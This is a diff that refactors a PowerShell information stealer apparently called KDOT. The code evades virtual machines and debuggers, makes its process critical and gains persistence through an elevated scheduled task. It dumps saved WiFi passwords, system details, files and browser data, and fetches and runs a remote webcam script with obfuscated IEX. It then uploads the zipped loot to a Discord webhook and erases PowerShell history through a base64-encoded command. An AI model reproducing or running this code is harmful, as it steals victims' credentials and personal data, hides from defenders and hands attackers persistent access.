@@ -1,4 +1,4 @@
-$debug = $false
+$debug = $true
 
 if ($debug) {
     $ProgressPreference = 'Continue'
@@ -86,51 +86,31 @@ function make_error_page {
 }
 
 function Search-Mac ($mac_addresses) {
-    $pc_mac = (Get-WmiObject win32_networkadapterconfiguration -ComputerName $env:COMPUTERNAME | Where-Object { $_.IpEnabled -Match "True" } | Select-Object -Expand macaddress) -join ","
-    ForEach ($mac123 in $mac_addresses) {
-        if ($pc_mac -contains $mac123) {
-            return $true
-        }
-    }
-    return $false
+    $pc_mac = Get-WmiObject win32_networkadapterconfiguration -ComputerName $env:COMPUTERNAME | Where-Object { $_.IpEnabled -Match "True" } | Select-Object -ExpandProperty macaddress -join ","
+    return $mac_addresses -contains $pc_mac
 }
 
 function Search-IP ($ip_addresses) {
     $pc_ip = Invoke-WebRequest -Uri "https://api.ipify.org" -UseBasicParsing
     $pc_ip = $pc_ip.Content
-    ForEach ($ip123 in $ip_addresses) {
-        if ($pc_ip -contains $ip123) {
-            return $true
-        }
-    }
-    return $false
+    return $ip_addresses -contains $pc_ip
 }
 
 function Search-HWID ($hwids) {
     $pc_hwid = Get-WmiObject -Class Win32_ComputerSystemProduct | Select-Object -ExpandProperty UUID
-    ForEach ($hwid123 in $hwids) {
-        if ($pc_hwid -contains $hwid123) {
-            return $true
-        }
-    }
-    return $false
+    return $hwids -contains $pc_hwid
 }
 
 function Search-Username ($usernames) {
     $pc_username = $env:USERNAME
-    ForEach ($username123 in $usernames) {
-        if ($pc_username -contains $username123) {
-            return $true
-        }
-    }
-    return $false
+    return $usernames -contains $pc_username
 }
 
 function ram_check {
-    $ram = Get-WmiObject -Class Win32_PhysicalMemory | Measure-Object -Property capacity -Sum | ForEach-Object { [Math]::Round(($_.Sum / 1GB), 2) }
+    $ram = (Get-WmiObject -Class Win32_PhysicalMemory | Measure-Object -Property capacity -Sum).Sum / 1GB
     if ($ram -lt 4) {
         make_error_page "RAM CHECK FAILED"
-        Start-Sleep -s 3
+        Start-Sleep -Seconds 3
         exit
     }
 }
@@ -180,19 +160,14 @@ function VMBYPASSER {
         "x64dbg",
         "xenservice"
     )
-    $detectedProcesses = $processnames | ForEach-Object {
-        $processName = $_
-        if (Get-Process -Name $processName -Erroraction SilentlyContinue) {
-            $processName
-        }
-    }
+    $detectedProcesses = Get-Process -Name $processnames -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Name
 
-    if ($null -eq $detectedProcesses) { 
-        Invoke-ANTITOTAL
-    }
-    else { 
+    if ($detectedProcesses) { 
         Write-Output "Detected processes: $($detectedProcesses -join ', ')"
         Exit 1
+    }
+    else { 
+        Invoke-ANTITOTAL
     }
 }
 
@@ -226,10 +201,8 @@ function Invoke-ANTITOTAL {
                 exit
             }
         }
-        else {
-            ""
-        }
     }
+
     [ProcessUtility]::MakeProcessCritical()	
     Invoke-TASKS
 }
@@ -252,7 +225,7 @@ function HOSTS-BLOCKER {
 
 
 function Request-Admin {
-    while (!(INVOKE-AC)) {
+    while (-not (INVOKE-AC)) {
         try {
             Start-Process "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
             exit
@@ -262,17 +235,15 @@ function Request-Admin {
 }
 
 function Backup-Data {
-	
-	$uuid = Get-WmiObject -Class Win32_ComputerSystemProduct | Select-Object -ExpandProperty UUID
-	$timezone = Get-TimeZone
-    $offsetHours = $timezone.BaseUtcOffset.Hours
-    $timezoneString = "UTC$($offsetHours)"
-	$filedate = (Get-Date).ToUniversalTime().ToString("yyyy-MM-dd")
-    $countryCode = Invoke-WebRequest -Uri "https://ipapi.co/$ip/country_code" -UseBasicParsing
-    $countryCodeContent = $countryCode.Content
-    $folderformat = Join-Path -Path "$env:APPDATA\KDOT" -ChildPath "$countryCodeContent-($uuid)-($filedate)-($timezoneString)"
 
-	
+    $uuid = (Get-WmiObject -Class Win32_ComputerSystemProduct).UUID
+    $timezone = Get-TimeZone
+    $offsetHours = $timezone.BaseUtcOffset.Hours
+    $timezoneString = "UTC$offsetHours"
+    $filedate = Get-Date -Format "yyyy-MM-dd"
+    $countryCode = (Invoke-WebRequest -Uri "https://ipapi.co/$ip/country_code" -UseBasicParsing).Content
+    $folderformat = "$env:APPDATA\KDOT\$countryCode-($uuid)-($filedate)-($timezoneString)"
+
     $folder_general = $folderformat
     $folder_messaging = "$folderformat\Messaging Sessions"
     $folder_gaming = "$folderformat\Gaming Sessions"
@@ -282,36 +253,28 @@ function Backup-Data {
     $important_files = "$folderformat\Important Files"
     $browser_data = "$folderformat\Browser Data"
 
-    New-Item -ItemType Directory -Path $folder_general -Force
-    New-Item -ItemType Directory -Path $folder_messaging -Force
-    New-Item -ItemType Directory -Path $folder_gaming -Force
-    New-Item -ItemType Directory -Path $folder_crypto -Force
-    New-Item -ItemType Directory -Path $folder_vpn -Force
-    New-Item -ItemType Directory -Path $browser_data -Force
-    New-Item -ItemType Directory -Path $folder_email -Force
-    New-Item -ItemType Directory -Path $important_files -Force
+    $folders = @($folder_general, $folder_messaging, $folder_gaming, $folder_crypto, $folder_vpn, $folder_email, $important_files, $browser_data)
+    $folders | ForEach-Object {
+        New-Item -ItemType Directory -Path $_ -Force
+    }
 
     #bulk data (added build ID with banner)
-	$ip = Invoke-WebRequest -Uri "https://api.ipify.org" -UseBasicParsing
-    $ip = $ip.Content
-	$lang = (Get-WinUserLanguageList).LocalizedName
-    $date = (get-date).toString("r")
-	$osversion = (Get-WmiObject -class Win32_OperatingSystem).Caption
-    $osbuild = (Get-ItemProperty -Path c:\windows\system32\hal.dll).VersionInfo.FileVersion
-    $displayversion = (Get-Item "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion").GetValue('DisplayVersion')
-	$mfg = (Get-WmiObject win32_computersystem).Manufacturer
-	$model = (Get-WmiObject -Class:Win32_ComputerSystem).Model
-    $model = (Get-WmiObject -Class:Win32_ComputerSystem).Model
-    $CPU = Get-WmiObject -Class Win32_Processor | Select-Object -ExpandProperty Name
-	$pinfo = Get-WmiObject -Class Win32_Processor
-	$corecount = $($pinfo.NumberOfCores)
-    $GPU = (Get-WmiObject Win32_VideoController).Name 
-    $total = Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property capacity -Sum | ForEach-Object { "{0:N2}" -f ([math]::round(($_.Sum / 1GB), 2)) }
-	$format = " GB"
-    $raminfo = "$total" + "$format"  
-    $mac = (Get-WmiObject win32_networkadapterconfiguration -ComputerName $env:COMPUTERNAME | Where-Object { $_.IpEnabled -Match "True" } | Select-Object -Expand macaddress) -join ","
+    $ip = (Invoke-RestMethod -Uri "https://api.ipify.org").ip
+    $lang = (Get-WinUserLanguageList).LocalizedName
+    $date = Get-Date -Format "r"
+    $osversion = (Get-CimInstance -ClassName Win32_OperatingSystem).Caption
+    $osbuild = (Get-ItemProperty -Path "C:\Windows\System32\hal.dll").VersionInfo.FileVersion
+    $displayversion = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion").DisplayVersion
+    $mfg = (Get-CimInstance -ClassName Win32_ComputerSystem).Manufacturer
+    $model = (Get-CimInstance -ClassName Win32_ComputerSystem).Model
+    $CPU = (Get-CimInstance -ClassName Win32_Processor).Name
+    $corecount = (Get-CimInstance -ClassName Win32_Processor).NumberOfCores
+    $GPU = (Get-CimInstance -ClassName Win32_VideoController).Name
+    $total = (Get-CimInstance -ClassName Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum).Sum / 1GB
+    $raminfo = "{0:N2} GB" -f $total
+    $mac = (Get-CimInstance -ClassName Win32_NetworkAdapterConfiguration | Where-Object { $_.IPEnabled -eq $true }).MACAddress -join ","
     $username = $env:USERNAME
-    $hostname = $env:COMPUTERNAME	
+    $hostname = $env:COMPUTERNAME
 	
 	# A cool banner 
 	$guid = [Guid]::NewGuid()
@@ -322,57 +285,84 @@ function Backup-Data {
     $ptgstrings = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($ptgbanner))
     $ptginfo = "$ptgstrings`nLog Name : $hostname `nBuild ID : $prefixedGuid`n"
 	
-	function Get-Uptime {
+    function Get-Uptime {
         $ts = (Get-Date) - (Get-CimInstance -ClassName Win32_OperatingSystem -ComputerName $computername).LastBootUpTime
         $uptimedata = '{0} days {1} hours {2} minutes {3} seconds' -f $ts.Days, $ts.Hours, $ts.Minutes, $ts.Seconds
         $uptimedata
     }
     $uptime = Get-Uptime
-	
-	function get-installed-av {
+
+    function Get-InstalledAV {
         $wmiQuery = "SELECT * FROM AntiVirusProduct"
-        $AntivirusProduct = Get-WmiObject -Namespace "root\SecurityCenter2" -Query $wmiQuery  @psboundparameters 
-        $AntivirusProduct.displayName 
+        $AntivirusProduct = Get-WmiObject -Namespace "root\SecurityCenter2" -Query $wmiQuery
+        $AntivirusProduct.displayName
     }
-    $avlist = get-installed-av -autosize | Format-Table | out-string
+    $avlist = Get-InstalledAV | Format-Table | Out-String
 	
-	$width = (((Get-WmiObject -Class Win32_VideoController).VideoModeDescription -split '\n')[0] -split ' ')[0]
-    $height = (((Get-WmiObject -Class Win32_VideoController).VideoModeDescription -split '\n')[0] -split ' ')[2]  
-    $split = "x"
-    $screen = "$width" + "$split" + "$height"
-	$software = Get-ItemProperty "HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | Where-Object { $_.DisplayName -ne $null -and $_.DisplayVersion -ne $null } | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -wrap -autosize | out-string
-    $network = Get-NetAdapter | Format-Table Name, InterfaceDescription, PhysicalMediaType, NdisPhysicalMedium | out-string
-	$startupapps =  Get-CimInstance Win32_StartupCommand | Select-Object Name, command, Location, User | Format-List | out-string
-	$runningapps = Get-WmiObject win32_process | Select-Object Name, Description, ProcessId, ThreadCount, Handles | Format-Table -wrap -autosize | out-string
-	$services = Get-WmiObject win32_service | Where-Object State -match "running" | Select-Object Name, DisplayName | Sort-Object Name | Format-Table -wrap -autosize | out-string
+    $width = (Get-WmiObject -Class Win32_VideoController).VideoModeDescription -split '\n' | Select-Object -First 1 | ForEach-Object { ($_ -split ' ')[0] }
+    $height = (Get-WmiObject -Class Win32_VideoController).VideoModeDescription -split '\n' | Select-Object -First 1 | ForEach-Object { ($_ -split ' ')[2] }
+    $screen = "$width x $height"
+
+    $software = Get-ItemProperty "HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" |
+        Where-Object { $_.DisplayName -ne $null -and $_.DisplayVersion -ne $null } |
+        Select-Object DisplayName, DisplayVersion, Publisher, InstallDate |
+        Format-Table -Wrap -AutoSize |
+        Out-String
+
+    $network = Get-NetAdapter |
+        Select-Object Name, InterfaceDescription, PhysicalMediaType, NdisPhysicalMedium |
+        Out-String
+
+    $startupapps = Get-CimInstance Win32_StartupCommand |
+        Select-Object Name, Command, Location, User |
+        Format-List |
+        Out-String
+
+    $runningapps = Get-WmiObject Win32_Process |
+        Select-Object Name, Description, ProcessId, ThreadCount, Handles |
+        Format-Table -Wrap -AutoSize |
+        Out-String
+
+    $services = Get-WmiObject Win32_Service |
+        Where-Object State -eq "Running" |
+        Select-Object Name, DisplayName |
+        Sort-Object Name |
+        Format-Table -Wrap -AutoSize |
+        Out-String
 	
-	function diskdata {
-        $disks = get-wmiobject -class "Win32_LogicalDisk" -namespace "root\CIMV2"
+    function diskdata {
+        $disks = Get-WmiObject -Class "Win32_LogicalDisk" -Namespace "root\CIMV2" | Where-Object { $_.Size -gt 0 }
         $results = foreach ($disk in $disks) {
-            if ($disk.Size -gt 0) {
-                $SizeOfDisk = [math]::round($disk.Size / 1GB, 0)
-                $FreeSpace = [math]::round($disk.FreeSpace / 1GB, 0)
-                $usedspace = [math]::round(($disk.size - $disk.freespace) / 1GB, 2)
-                [int]$FreePercent = ($FreeSpace / $SizeOfDisk) * 100
-                [int]$usedpercent = ($usedspace / $SizeOfDisk) * 100
-                [PSCustomObject]@{
-                    Drive             = $disk.Name
-                    Name              = $disk.VolumeName
-                    "Total Disk Size" = "{0:N0} GB" -f $SizeOfDisk 
-                    "Free Disk Size"  = "{0:N0} GB ({1:N0} %)" -f $FreeSpace, ($FreePercent)
-                    "Used Space"      = "{0:N0} GB ({1:N0} %)" -f $usedspace, ($usedpercent)
-                }
+            $SizeOfDisk = [math]::Round($disk.Size / 1GB, 0)
+            $FreeSpace = [math]::Round($disk.FreeSpace / 1GB, 0)
+            $usedspace = [math]::Round(($disk.Size - $disk.FreeSpace) / 1GB, 2)
+            $FreePercent = [int](($FreeSpace / $SizeOfDisk) * 100)
+            $usedpercent = [int](($usedspace / $SizeOfDisk) * 100)
+            [PSCustomObject]@{
+                Drive             = $disk.Name
+                Name              = $disk.VolumeName
+                "Total Disk Size" = "{0:N0} GB" -f $SizeOfDisk 
+                "Free Disk Size"  = "{0:N0} GB ({1:N0} %)" -f $FreeSpace, $FreePercent
+                "Used Space"      = "{0:N0} GB ({1:N0} %)" -f $usedspace, $usedpercent
             }
         }
         $results 
     }
-    $alldiskinfo = diskdata -wrap -autosize | Format-List | out-string
-	$info = "$ptginfo`n`n`nIP: $ip `nLanguage: $lang `nDate: $date `nTimezone: $timezoneString `nScreen Size: $screen `nUser Name: $username `nOS: $osversion `nOS Build: $osbuild `nOS Version: $displayversion `nManufacturer: $mfg `nModel: $model `n`n[Disk Info] $alldiskinfo `n[Hardware] `nCPU: $cpu `nCores: $corecount `nGPU: $gpu `nRAM: $raminfo `nHWID: $uuid `nMAC: $mac `nUptime: $uptime `nAntiVirus: $avlist `n`n[Network] $network `n[Startup Applications] $startupapps `n[Processes] $runningapps `n[Services] $services `n[Software] $software"
-    $info > $folder_general\System.txt
-	
-	$wifipasslist = netsh wlan show profiles | Select-String "\:(.+)$" | % { $name = $_.Matches.Groups[1].Value.Trim(); $_ } | % { (netsh wlan show profile name="$name" key=clear) } | Select-String "Key Content\W+\:(.+)$" | % { $pass = $_.Matches.Groups[1].Value.Trim(); $_ } | % { [PSCustomObject]@{ PROFILE_NAME = $name; PASSWORD = $pass } } | Format-Table -AutoSize 
-    $wifi = $wifipasslist | out-string 
-    $wifi > $folder_general\WIFIPasswords.txt
+    $alldiskinfo = diskdata -wrap -autosize | Format-List | Out-String
+    $info = "$ptginfo`n`n`nIP: $ip `nLanguage: $lang `nDate: $date `nTimezone: $timezoneString `nScreen Size: $screen `nUser Name: $username `nOS: $osversion `nOS Build: $osbuild `nOS Version: $displayversion `nManufacturer: $mfg `nModel: $model `n`n[Disk Info] $alldiskinfo `n[Hardware] `nCPU: $cpu `nCores: $corecount `nGPU: $gpu `nRAM: $raminfo `nHWID: $uuid `nMAC: $mac `nUptime: $uptime `nAntiVirus: $avlist `n`n[Network] $network `n[Startup Applications] $startupapps `n[Processes] $runningapps `n[Services] $services `n[Software] $software"
+    $info | Out-File -FilePath "$folder_general\System.txt" -Encoding UTF8
+
+    $wifipasslist = netsh wlan show profiles | Select-String "\:(.+)$" | ForEach-Object {
+        $name = $_.Matches.Groups[1].Value.Trim()
+        (netsh wlan show profile name="$name" key=clear) | Select-String "Key Content\W+\:(.+)$" | ForEach-Object {
+            [PSCustomObject]@{
+                PROFILE_NAME = $name
+                PASSWORD = $_.Matches.Groups[1].Value.Trim()
+            }
+        }
+    }
+    $wifi = $wifipasslist | Format-Table -AutoSize | Out-String
+    $wifi | Out-File -FilePath "$folder_general\WIFIPasswords.txt" -Encoding UTF8
 
     function Get-ProductKey {
         try {
@@ -755,7 +745,7 @@ function Backup-Data {
                     @{
                         "name"  = ":floppy_disk: Disk"
                         "value" = "``````$alldiskinfo``````"
-                    }
+                    },
                     @{
                         "name"  = ":signal_strength: WiFi"
                         "value" = "``````$wifi``````"
@@ -774,14 +764,14 @@ function Backup-Data {
         I'E'X(New-Object Net.WebClient)."`D`o`wn`l`oa`d`Str`in`g"("https://github.com/Chainski/PowerShell-Token-Grabber/raw/main/frontend-src/webcam.ps1")
     }
     Get-WebcamIMG
-	
+
     $items = Get-ChildItem -Path "$env:APPDATA\KDOT" -Filter out*.jpg
     foreach ($item in $items) {
         $name = $item.Name
         curl.exe -F "payload_json={\`"username\`": \`"KDOT\`", \`"content\`": \`":hamsa: **webcam**\`"}" -F "file=@\`"$env:APPDATA\KDOT\$name\`"" $webhook | out-null
         Remove-Item -Path "$env:APPDATA\KDOT\$name" -Force
     }
-	
+
 	Function Invoke-GrabFiles {
         $grabber = @(
             "2fa",
@@ -895,9 +885,9 @@ function Backup-Data {
 
     #remove empty dirs
     do {
-        $dirs = Get-ChildItem $folder_general -directory -recurse | Where-Object { (Get-ChildItem $_.fullName).count -eq 0 } | Select-Object -expandproperty FullName
-        $dirs | Foreach-Object { Remove-Item $_ }
-    } while ($dirs.count -gt 0)
+        $dirs = Get-ChildItem $folder_general -Directory -Recurse | Where-Object { (Get-ChildItem $_.FullName).Count -eq 0 } | Select-Object -ExpandProperty FullName
+        $dirs | ForEach-Object { Remove-Item $_ -Force }
+    } while ($dirs.Count -gt 0)
 
     Compress-Archive -Path "$folder_general" -DestinationPath "$env:LOCALAPPDATA\Temp\KDOT.zip" -Force
     curl.exe -X POST -F 'payload_json={\"username\": \"KDOT\", \"content\": \"\", \"avatar_url\": \"https://i.postimg.cc/k58gQ03t/PTG.gif\"}' -F "file=@$env:LOCALAPPDATA\Temp\KDOT.zip" $webhook
@@ -921,7 +911,8 @@ function Invoke-TASKS {
     $task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable
     Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $task_settings -TaskName $task_name -Description "KDOT" -RunLevel Highest -Force
     Write-Host "Task Created" -ForegroundColor Green
-	HOSTS-BLOCKER
+
+    HOSTS-BLOCKER
     Backup-Data
 }
 
@@ -937,7 +928,7 @@ if (INVOKE-AC -eq $true) {
     if ($debug) {
         Read-Host "Press Enter to continue..."
     } else {
-         [ProcessUtility]::MakeProcessKillable()
+        [ProcessUtility]::MakeProcessKillable()
     }
     I'E'X([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("UmVtb3ZlLUl0ZW0gKEdldC1QU3JlYWRsaW5lT3B0aW9uKS5IaXN0b3J5U2F2ZVBhdGggLUZvcmNlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVl")))
 }
